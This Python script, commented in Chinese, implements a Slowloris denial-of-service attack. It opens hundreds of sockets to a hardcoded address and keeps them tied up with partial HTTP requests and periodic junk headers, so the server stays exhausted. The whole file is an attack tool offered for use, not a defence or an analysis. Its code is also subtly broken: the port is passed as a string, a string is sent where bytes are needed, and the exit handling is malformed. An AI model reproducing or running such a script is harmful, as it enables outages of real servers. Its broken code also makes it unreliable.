import socket
import logging
import random
import time

def main():
    #目标ip
    ip='1.1.1.1'
    port='80'
    #设置socket连接数
    socket_count='888'
    sleeptime=10
    list_sockets=[]

    ##设置输出日志
    #logging.basicConfig(filename='logger.log',level=logging.INFO)
    logging.basicConfig(level=logging.DEBUG)
    logging.info("Attacking %s with %s sockets.",ip,socket_count)
    logging.info("Creating sockets...")

    #请求连接
    for n in range(int(socket_count)):
        try:
            logging.debug("请求连接%s中...",n)
            s=conn_socket(ip,port)
        except socket.error as e:
            logging.debug(e)
            break
        list_sockets.append(s)

    while True:
        try:
            logging.info("正在建立连接... Socket count: %s",len(list_sockets))
            for s in list(list_sockets):
                try:
                    s.send("X-a:{}\r\n".format( random.randint(1, 5000)).encode("utf-8"))
                except socket.error:
                    list_sockets.remove(s)

            for _ in range(int(socket_count) - len(list_sockets)):
                logging.debug("Recreating socket...")
                try:
                    s = conn_socket(ip,port)
                    if s:
                        list_sockets.append(s)
                except socket.error as e:
                    logging.debug(e)
                    break
            logging.debug("Sleeping for %d seconds",sleeptime)
            time.sleep(sleeptime)
        except(exit()):
            logging.info("Stopping Slowloris")
            break




####创建socket
def conn_socket(ip,port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(4)#4秒后停止连接
    # #判断是否是ssl协议
    # if args.https:
    #     ctx = ssl.create_default_context()
    #     s = ctx.wrap_socket(s, server_hostname=args.host)

    s.connect((ip,port))
    ##随意请求一个不存在的url连接
    s.send(f"GET /?{random.randint(0, 2000)} HTTP/1.1")

    # ua = user_agents[0]
    # if args.randuseragent:
    #     ua = random.choice(user_agents)
    # #请求头设置
    # s.send_header("User-Agent", ua)
    # s.send_header("Accept-language", "en-US,en,q=0.5")
    return s






if __name__ == '__main__':
    main()
